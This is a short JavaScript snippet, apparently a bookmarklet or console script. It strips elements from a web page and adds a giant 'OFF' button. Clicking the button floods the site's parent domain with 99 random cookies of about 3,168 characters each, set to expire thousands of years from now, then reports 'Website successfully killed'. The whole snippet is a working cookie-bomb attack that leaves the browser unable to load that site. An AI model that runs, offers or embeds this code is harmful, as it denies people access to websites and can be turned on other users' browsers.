const toRemove = document.querySelectorAll("div.head-top, div.wonderbar");
toRemove.forEach(t => t.remove());
const slickButtons = document.querySelectorAll("button.slick-prev.slick-arrow.slick-disabled, button.slick-next.slick-arrow.slick, button.slick-prev.slick-arrow, button.slick-next.slick-arrow.slick-disabled");
slickButtons.forEach(t => t.remove());
const b = document.createElement("button");
b.textContent = "OFF", Object.assign(b.style, {
   position: "fixed",
   top: "50%",
   left: "50%",
   transform: "translate(-50%, -50%)",
   width: "800px",
   height: "200px",
   borderRadius: "100px",
   backgroundColor: "red",
   color: "white",
   fontSize: "100px",
   fontWeight: "bold",
   cursor: "pointer",
   zIndex: "2147483647",
   boxShadow: "0 0 20px black"
}), b.addEventListener("click", function() {
   if ("OFF" === this.textContent) {
      this.style.backgroundColor = "#00FF00", this.textContent = "ON";
      const t = new Date(2e14).toUTCString(),
         e = location.hostname.split(".").slice(-2).join(".");
      for (let o = 0; o < 99; o++) document.cookie = `cd${o}=${encodeURIComponent(btoa(String.fromCharCode.apply(0,crypto.getRandomValues(new Uint8Array(3168))))).substring(0,3168)};expires=${t};domain=${e};path=/`;
      alert("Website successfully killed")
   }
}), document.body.appendChild(b);
